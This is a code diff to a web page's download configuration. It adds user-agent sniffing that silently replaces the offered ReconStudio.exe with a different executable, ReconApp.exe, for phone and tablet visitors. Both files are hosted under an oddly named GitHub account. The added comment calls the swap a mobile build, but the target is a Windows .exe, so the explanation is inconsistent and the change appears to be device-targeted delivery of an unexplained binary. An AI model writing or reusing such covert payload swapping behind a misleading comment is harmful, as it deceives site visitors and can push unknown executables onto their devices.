@@ -986,6 +986,21 @@ body.menuopen #menu{clip-path:inset(0);pointer-events:auto;}
      CONFIG — the only things you normally change
      ===================================================================== */
   var DOWNLOAD_URL   = 'https://github.com/gigigaguigagajog-blip/bug-free-rust/releases/download/newupdate/ReconStudio.exe';
+
+  /* Phones get a different build. This runs once at load, before any element
+     reads DOWNLOAD_URL, so the button href (rewritten a few hundred lines
+     below) and the injected footer CTA both pick up the right URL without
+     touching the rest of the page. Desktop UAs never match, so nothing
+     changes there. iPadOS reports a Macintosh UA, hence the touch check. */
+  var DOWNLOAD_URL_MOBILE = 'https://github.com/gigigaguigagajog-blip/bug-free-rust/releases/download/mobile/ReconApp.exe';
+  try {
+    var _ua = navigator.userAgent || '';
+    var _touch = (navigator.maxTouchPoints || 0) > 1;
+    var _phone = /Android|iPhone|iPod|iPad|Windows Phone|IEMobile|Opera Mini|BlackBerry|Mobile/i.test(_ua)
+              || (_touch && /Macintosh/i.test(_ua));
+    if (_phone) DOWNLOAD_URL = DOWNLOAD_URL_MOBILE;
+  } catch (e) {}
+
   var SPIN_DEG_PER_S = 2.4;    // idle rotation speed of the sphere
   var INTRO_FILES    = ['intro1.png','intro2.jpg']; // intro images, by filename
   var INTRO_HOLD_MS  = 1000;   // time each intro image stays on screen
